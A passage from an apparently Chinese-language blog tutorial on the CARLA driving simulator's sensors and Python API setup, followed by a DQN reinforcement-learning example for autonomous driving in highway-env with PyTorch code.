title="2.10.3 其它"></a>2.10.3 其它</h4><p>不同的功能，例如导航、物理属性测量和场景的 2D&#x2F;3D 点图。</p><table><thead><tr><th>传感器</th><th>输出</th><th>概述</th></tr></thead><tbody><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#gnss-sensor">GNSS</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlagnssmeasurement">carla.GNSSMeasurement</a></td><td>检索传感器的地理位置。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#imu-sensor">IMU</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimumeasurement">carla.IMUMeasurement</a></td><td>包括加速度计、陀螺仪和指南针。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#lidar-sensor">LIDAR</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlalidarmeasurement">carla.LidarMeasurement</a></td><td>旋转激光雷达。 生成一个 4D 点云，每个点的坐标和强度对周围环境进行建模。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#radar-sensor">Radar</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaradarmeasurement">carla.RadarMeasurement</a></td><td>2D 点图建模元素在视线内及其与传感器有关的运动。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#rss-sensor">RSS</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlarssresponse">carla.RssResponse</a></td><td>根据安全检查修改应用于车辆的控制器。 此传感器的工作方式与其他传感器不同，并且有专门的 RSS 文档。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#semantic-lidar-sensor">Semantic LIDAR</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlasemanticlidarmeasurement">carla.SemanticLidarMeasurement</a></td><td>旋转激光雷达。 生成具有有关实例和语义分割的额外信息的 3D 点云。</td></tr></tbody></table><ul><li><strong>Camera构建</strong></li></ul><p>与汽车类似，我们先创建蓝图，再定义位置，然后再选择我们想要的汽车安装上去。不过，这里的位置都是相对汽车中心点的位置（以米计量）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">camera_bp = blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line">camera_transform = carla.Transform(carla.Location(x=<span class="number">1.5</span>, z=<span class="number">2.4</span>))</span><br><span class="line">camera = world.spawn_actor(camera_bp, camera_transform, attach_to=ego_vehicle)</span><br></pre></td></tr></table></figure><p>我们还要对相机定义它的callback function,定义每次仿真世界里传感器数据传回来后，我们要对它进行什么样的处理。在这个教程里我们只需要简单地将文件存在硬盘里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">camera.listen(<span class="keyword">lambda</span> image: image.save_to_disk(os.path.join(output_path, <span class="string">&#x27;%06d.png&#x27;</span> % image.frame)))</span><br></pre></td></tr></table></figure><ul><li><strong>Lidar构建</strong></li></ul><p>Lidar可以设置的参数比较多，对Lidar模型不熟也没有关系，我在后面会另开文章详细介绍激光雷达模型，现在就知道我们设置了一些常用参数就好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lidar_bp = blueprint_library.find(<span class="string">&#x27;sensor.lidar.ray_cast&#x27;</span>)</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;channels&#x27;</span>, <span class="built_in">str</span>(<span class="number">32</span>))</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;points_per_second&#x27;</span>, <span class="built_in">str</span>(<span class="number">90000</span>))</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;rotation_frequency&#x27;</span>, <span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;range&#x27;</span>, <span class="built_in">str</span>(<span class="number">20</span>))</span><br></pre></td></tr></table></figure><p>接着把lidar放置在奔驰上, 定义它的callback function.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lidar_location = carla.Location(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">lidar_rotation = carla.Rotation(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">lidar_transform = carla.Transform(lidar_location, lidar_rotation)</span><br><span class="line">lidar = world.spawn_actor(lidar_bp, lidar_transform, attach_to=ego_vehicle)</span><br><span class="line">lidar.listen(<span class="keyword">lambda</span> point_cloud: \</span><br><span class="line">            point_cloud.save_to_disk(os.path.join(output_path, <span class="string">&#x27;%06d.ply&#x27;</span> % point_cloud.frame</span><br></pre></td></tr></table></figure><h2 id="3-PythonAPI的使用"><a href="#3-PythonAPI的使用" class="headerlink" title="3. PythonAPI的使用"></a>3. PythonAPI的使用</h2><h4 id="3-1-配置默认库"><a href="#3-1-配置默认库" class="headerlink" title="3.1 配置默认库"></a>3.1 配置默认库</h4><p>我们之前虽然已经make好了Carla的PythonAPI, 但是并没有将它的库安装到我们默认的python3里，如果你查看carla自带的example, 会发现都要先进行以下操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sys.path.append(glob.glob(<span class="string">&#x27;../carla/dist/carla-*%d.%d-%s.egg&#x27;</span> % (</span><br><span class="line">        sys.version_info.major,</span><br><span class="line">        sys.version_info.minor,</span><br><span class="line">        <span class="string">&#x27;win-amd64&#x27;</span> <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;linux-x86_64&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">import</span> carla</span><br></pre></td></tr></table></figure><p>在我们的代码中，也要这样做。当然有一劳永逸的方法。将Carla Library安装到你的python3.7里。这是我个人研究的方法，不一定都能成功。</p><p>最新版本的CARLA模拟器，可以直接pip install carla解决。</p><p>如果安装了旧版，需要按照以下步骤进行：</p><p>使用anaconda激活car环境，cd命令进入PythonAPI&#x2F;carla&#x2F;dist。运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip carla-0.9.13-py3.7-win-amd64.egg -d carla-0.9.13-py3.7-win-amd64</span><br><span class="line">cd carla-0.9.13-py3.7-win-amd64</span><br></pre></td></tr></table></figure><p>在同目录下建立一个setup.py，复制进入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line">setup(name=<span class="string">&#x27;carla&#x27;</span>,</span><br><span class="line">      version=<span class="string">&#x27;0.9.10&#x27;</span>, </span><br><span class="line">      py_modules=[<span class="string">&#x27;carla&#x27;</span>],</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>最后通过pip命令安装进去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -e carla-0.9.13-py3.7-win-amd64</span><br></pre></td></tr></table></figure><h3 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h3><p>我原本准备详细写写他提供的pythonAPI，但是他提供的实在是非常多，后期只能用到什么查什么，写什么。这里放个官方文档地址。<a href="https://zlhou-carla-doc-cn.readthedocs.io/zh/latest/python_api/">Python API 参考 - CARLA 模拟器 中文文档 (zlhou-carla-doc-cn.readthedocs.io)</a></p><h2 id="4-基于DQN的自动驾驶"><a href="#4-基于DQN的自动驾驶" class="headerlink" title="4. 基于DQN的自动驾驶"></a>4. 基于DQN的自动驾驶</h2><h3 id="4-1-DQN"><a href="#4-1-DQN" class="headerlink" title="4.1 DQN"></a>4.1 DQN</h3><p>DQN（Deep Q-Learning）可谓是深度强化学习（Deep Reinforcement Learning，DRL）的开山之作，是将深度学习与强化学习结合起来从而实现从感知（Perception）到动作（ Action ）的端对端（End-to-end）学习的一种全新的算法。由DeepMind在NIPS 2013上发表，后又在Nature 2015上提出改进版本。</p><p>DQN是DRL的其中一种算法，它要做的就是将卷积神经网络（CNN）和Q-Learning结合起来，CNN的输入是原始图像数据（作为状态State），输出则是每个动作Action对应的价值评估Value Function（Q值）。</p><p><img src="/.io//20170612220809641" alt="这里写图片描述"></p><p>创新点：</p><p>基于Q-Learning构造Loss Function（不算很新，过往使用线性和非线性函数拟合Q-Table时就是这样做）。<br>通过experience replay（经验池）解决相关性及非静态分布问题；<br>使用TargetNet解决稳定性问题。<br>优点：</p><p>算法通用性，可玩不同游戏；<br>End-to-End 训练方式；<br>可生产大量样本供监督学习。<br>缺点：</p><p>无法应用于连续动作控制；<br>只能处理只需短时记忆问题，无法处理需长时记忆问题（后续研究提出了使用LSTM等改进方法）；<br>CNN不一定收敛，需精良调参。</p><h3 id="4-2-DQN自动驾驶"><a href="#4-2-DQN自动驾驶" class="headerlink" title="4.2 DQN自动驾驶"></a>4.2 DQN自动驾驶</h3><p>这里我们用pytroch+gym实现一下来感受深度强化学习。pytorch的环境配置之前已经说过，这里不多加赘述。</p><h4 id="4-2-1-配置环境"><a href="#4-2-1-配置环境" class="headerlink" title="4.2.1 配置环境"></a>4.2.1 配置环境</h4><p>gym是用于开发和比较强化学习算法的工具包，在python中安装gym库和其中子场景都较为简便。</p><p>安装gym：pip install gym</p><p>安装自动驾驶模块，这里使用Edouard Leurent发布在github上的包highway-env（原链接）：pip install –user git+<a href="https://github.com/eleurent/highway-env">https://github.com/eleurent/highway-env</a></p><p>其中包含6个场景：</p><ul><li><p>高速公路——“highway-v0”</p></li><li><p>汇入——“merge-v0”</p></li><li><p>环岛——“roundabout-v0”</p></li><li><p>泊车——“parking-v0”</p></li><li><p>十字路口——“intersection-v0”</p></li><li><p>赛车道——“racetrack-v0”</p></li></ul><h4 id="4-2-2-实验环境"><a href="#4-2-2-实验环境" class="headerlink" title="4.2.2 实验环境"></a>4.2.2 实验环境</h4><p>安装好后即可在代码中进行实验（以高速公路场景为例）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> highway_env</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line">env = gym.make(<span class="string">&#x27;highway-v0&#x27;</span>)</span><br><span class="line">env.reset()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    action = env.action_type.actions_indexes[<span class="string">&quot;IDLE&quot;</span>]</span><br><span class="line">    obs, reward, done, info = env.step(action)</span><br><span class="line">    env.render()</span><br></pre></td></tr></table></figure><p>会出现这样的画面：</p><p><img src="/.io//image-20220719182153218.png" alt="image-20220719182153218"></p><p>可以看到这是上帝视角。绿色的就是我们可以用代码操控的车。这样的游戏相对简单，数据比较好处理，大家也比较容易理解。</p><p>env类有很多参数可以配置，具体可以参考在github上的原文档。</p><h4 id="4-2-3-数据处理"><a href="#4-2-3-数据处理" class="headerlink" title="4.2.3 数据处理"></a>4.2.3 数据处理</h4><p>(1)state<br>highway-env包中没有定义传感器，车辆所有的state (observations) 都从底层代码读取，节省了许多前期的工作量。根据文档介绍，state (ovservations) 有三种输出方式：Kinematics，Grayscale Image和Occupancy grid。</p><p>Kinematics</p><p>输出V*F的矩阵，V代表需要观测的车辆数量（包括ego vehicle本身），F代表需要统计的特征数量。<br>例：</p><p>Vehiclexyv_xv_y<br>ego-vehicle5.04.015.00<br>vehicle1-10.04.012.00<br>vehicle213.08.013.50<br>数据生成时会默认归一化，取值范围：[100, 100, 20, 20]，也可以设置ego vehicle以外的车辆属性是地图的绝对坐标还是对ego vehicle的相对坐标。</p><p>在定义环境时需要对特征的参数进行设定：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">config = \</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">&quot;observation&quot;</span>: </span><br><span class="line">         &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Kinematics&quot;</span>,</span><br><span class="line">        <span class="comment">#选取5辆车进行观察（包括ego vehicle）</span></span><br><span class="line">        <span class="string">&quot;vehicles_count&quot;</span>: <span class="number">5</span>,  </span><br><span class="line">        <span class="comment">#共7个特征</span></span><br><span class="line">        <span class="string">&quot;features&quot;</span>: [<span class="string">&quot;presence&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;vx&quot;</span>, <span class="string">&quot;vy&quot;</span>, <span class="string">&quot;cos_h&quot;</span>, <span class="string">&quot;sin_h&quot;</span>], </span><br><span class="line">        <span class="string">&quot;features_range&quot;</span>: </span><br><span class="line">            &#123;</span><br><span class="line">            <span class="string">&quot;x&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;y&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;vx&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>],</span><br><span class="line">            <span class="string">&quot;vy&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">        <span class="string">&quot;absolute&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;order&quot;</span>: <span class="string">&quot;sorted&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="string">&quot;simulation_frequency&quot;</span>: <span class="number">8</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    <span class="string">&quot;policy_frequency&quot;</span>: <span class="number">2</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Grayscale-Image"><a href="#Grayscale-Image" class="headerlink" title="Grayscale Image"></a>Grayscale Image</h4><p>生成一张W*H的灰度图像，W代表图像宽度，H代表图像高度</p><h4 id="Occupancy-grid"><a href="#Occupancy-grid" class="headerlink" title="Occupancy grid"></a>Occupancy grid</h4><p>生成一个W<em>H</em>F的三维矩阵，用W*H的表格表示ego vehicle周围的车辆情况，每个格子包含F个特征。</p><p>(2) action</p><p>highway-env包中的action分为连续和离散两种。连续型action可以直接定义throttle和steering angle的值，离散型包含5个meta actions：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ACTIONS_ALL = &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&#x27;LANE_LEFT&#x27;</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="string">&#x27;IDLE&#x27;</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="string">&#x27;LANE_RIGHT&#x27;</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="string">&#x27;FASTER&#x27;</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="string">&#x27;SLOWER&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(3) reward</p><p>highway-env包中除了泊车场景外都采用同一个reward function：</p><p><img src="/.io//image-20220719182922431.png" alt="image-20220719182922431"></p><p>这个function只能在其源码中更改，在外层只能调整权重。</p><h4 id="4-2-4-搭建模型"><a href="#4-2-4-搭建模型" class="headerlink" title="4.2.4 搭建模型"></a>4.2.4 搭建模型</h4><p>这里采用第一种state表示方式——Kinematics进行示范。</p><p>由于state数据量较小（5辆车*7个特征），可以不考虑使用CNN，直接把二维数据的size[5,7]转成[1,35]即可，模型的输入就是35，输出是离散action数量，共5个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> T</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> FloatTensor, LongTensor, ByteTensor</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">device = torch.device(<span class="string">&#x27;cuda&#x27;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Tensor = FloatTensor</span><br><span class="line"></span><br><span class="line">EPSILON = <span class="number">0</span>  <span class="comment"># epsilon used for epsilon greedy approach</span></span><br><span class="line">GAMMA = <span class="number">0.9</span></span><br><span class="line">TARGET_NETWORK_REPLACE_FREQ = <span class="number">40</span>  <span class="comment"># How frequently target netowrk updates</span></span><br><span class="line">MEMORY_CAPACITY = <span class="number">100</span></span><br><span class="line">BATCH_SIZE = <span class="number">80</span></span><br><span class="line">LR = <span class="number">0.01</span>  <span class="comment"># learning rate</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DQNNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(DQNNet, self).__init__()</span><br><span class="line">        self.linear1 = nn.Linear(<span class="number">35</span>, <span class="number">256</span>).to(device)</span><br><span class="line">        self.linear2 = nn.Linear(<span class="number">256</span>, <span class="number">256</span>).to(device)</span><br><span class="line">        self.linear3 = nn.Linear(<span class="number">256</span>, <span class="number">5</span>).to(device)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, s</span>):</span><br><span class="line">        s = torch.FloatTensor(s)</span><br><span class="line">        s = s.view(s.size(<span class="number">0</span>), <span class="number">1</span>, <span class="number">35</span>)</span><br><span class="line">        s = s.to(device)</span><br><span class="line">        s = self.linear1(s)</span><br><span class="line">        s = self.linear2(s)</span><br><span class="line">        s = self.linear3(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DQN</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.net, self.target_net = DQNNet(), DQNNet()</span><br><span class="line">        self.learn_step_counter = <span class="number">0</span></span><br><span class="line">        self.memory = []</span><br><span class="line">        self.position = <span class="number">0</span></span><br><span class="line">        self.capacity = MEMORY_CAPACITY</span><br><span class="line">        self.optimizer = torch.optim.Adam(self.net.parameters(), lr=LR)</span><br><span class="line">        self.loss_func = nn.MSELoss().cuda()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">choose_action</span>(<span class="params">self, s, e</span>):</span><br><span class="line">        x = np.expand_dims(s, axis=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> np.random.uniform() &lt; <span class="number">1</span> - e:</span><br><span class="line">            actions_value = self.net.forward(x)</span><br><span class="line">            action = torch.<span class="built_in">max</span>(actions_value, -<span class="number">1</span>)[<span class="number">1</span>].data.cpu().numpy()</span><br><span class="line">            action = action.<span class="built_in">max</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            action = np.random.randint(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> action</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push_memory</span>(<span class="params">self, s, a, r, s_</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.memory) &lt; self.capacity:</span><br><span class="line">            self.memory.append(<span class="literal">None</span>)</span><br><span class="line">        self.memory[self.position] = Transition(torch.unsqueeze(torch.FloatTensor(s), <span class="number">0</span>),</span><br><span class="line">                                                torch.unsqueeze(torch.FloatTensor(s_), <span class="number">0</span>),\</span><br><span class="line">                                                torch.from_numpy(np.array([a])),</span><br><span class="line">                                                torch.from_numpy(np.array([r], dtype=<span class="string">&#x27;float32&#x27;</span>)))  <span class="comment">#</span></span><br><span class="line">        self.position = (self.position + <span class="number">1</span>) % self.capacity</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_sample</span>(<span class="params">self, batch_size</span>):</span><br><span class="line">        sample = random.sample(self.memory, batch_size)</span><br><span class="line">        <span class="keyword">return</span> sample</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">learn</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.learn_step_counter % TARGET_NETWORK_REPLACE_FREQ == <span class="number">0</span>:</span><br><span class="line">            self.target_net.load_state_dict(self.net.state_dict())</span><br><span class="line">        self.learn_step_counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        transitions = self.get_sample(BATCH_SIZE)</span><br><span class="line">        batch = Transition(*<span class="built_in">zip</span>(*transitions))</span><br><span class="line"></span><br><span class="line">        b_s = Variable(torch.cat(batch.state))</span><br><span class="line">        b_s_ = Variable(torch.cat(batch.next_state))</span><br><span class="line">        b_a = Variable(torch.cat(batch.action)).to(device)</span><br><span class="line">        b_r = Variable(torch.cat(batch.reward)).to(device)</span><br><span class="line"></span><br><span class="line">        q_eval = self.net.forward(b_s).squeeze(<span class="number">1</span>).gather(<span class="number">1</span>, b_a.unsqueeze(<span class="number">1</span>).to(torch.int64))</span><br><span class="line">        q_next = self.target_net.forward(b_s_).detach().to(device)  <span class="comment">#</span></span><br><span class="line">        q_target = b_r + GAMMA * q_next.squeeze(<span class="number">1</span>).<span class="built_in">max</span>(<span class="number">1</span>)[<span class="number">0</span>].view(BATCH_SIZE, <span class="number">1</span>).t().to(device)</span><br><span class="line">        loss = self.loss_func(q_eval, q_target.t()).to(device)</span><br><span class="line">        self.optimizer.zero_grad()  <span class="comment"># reset the gradient to zero</span></span><br><span class="line">        loss.backward()</span><br><span class="line">        self.optimizer.step()  <span class="comment"># execute back propagation for one step</span></span><br><span class="line">        <span class="keyword">return</span> loss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transition = namedtuple(<span class="string">&#x27;Transition&#x27;</span>, (<span class="string">&#x27;state&#x27;</span>, <span class="string">&#x27;next_state&#x27;</span>, <span class="string">&#x27;action&#x27;</span>, <span class="string">&#x27;reward&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li>模型结构</li></ul><p>这里对原作者的网络结构进行了更改。在example里设置的模型只有一个隐藏层，neuron数量和输入层相同，即模型结构为[35,35,5]，把隐藏层的数量和neuron数都增大，这里设为了[35,256,256,5]，模型效果有所提升。</p><ul><li>reward定义</li></ul><p>highway-env环境内部对于reward的定义比较固定，不支持自由更改，如果想高度自定义reward，建议在环境外部自己写function，不要使用环境反馈的reward。</p><p>在highway-env的官方文档中又有说明，奖励必须是有界的，所以无论如何在config里设置奖励或惩罚的数值，都会被归一化，使其介于[0,1]。如果因为认为模型碰撞发生率过高，为了让它更注重避障，在config里把碰撞的惩罚设置成一个很小的负数，环境对碰撞的奖励输出还是0，但是加速奖励因为归一化的下界变化变得更接近1了，这样相当于没有减小碰撞奖励，反而增大了速度奖励，适得其反，模型变得更激进了。碰撞惩罚越大，发生碰撞的概率越高。</p><ul><li>网络价值分析</li></ul><p>假设当前DQN已经训练到最优，即对每个局面下的每个动作价值输出都是准确的，并且策略会在每个状态下做出最优选择。由于env定义的reward介于[0,1]，可以使用等比数列求和公式计算出最理想情况下每个动作值的上界。<br>$$<br>Qmax &#x3D; 1+γ∗1+γ∗(γ∗1)+γ∗(γ∗(γ∗1))+…&#x3D;1&#x2F;(1-γ)<br>$$<br>如果期望的收益是有限的，那么γ一定小于1，如果设为0.8，模型能输出的最大Q值是5，如果设为0.9，模型能输出的最大Q值是10，以此类推。如果模型输出的某个动作Q值超过了这个数，就可以认为模型没有正确学习到价值，学习过程有bug，需要检查代码。</p><h4 id="4-2-5-开始训练"><a href="#4-2-5-开始训练" class="headerlink" title="4.2.5 开始训练"></a>4.2.5 开始训练</h4><p>初始化环境，加入DQN的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> highway_env</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> DQNnet <span class="keyword">import</span> DQN</span><br><span class="line">config = \</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">&quot;observation&quot;</span>: </span><br><span class="line">         &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span 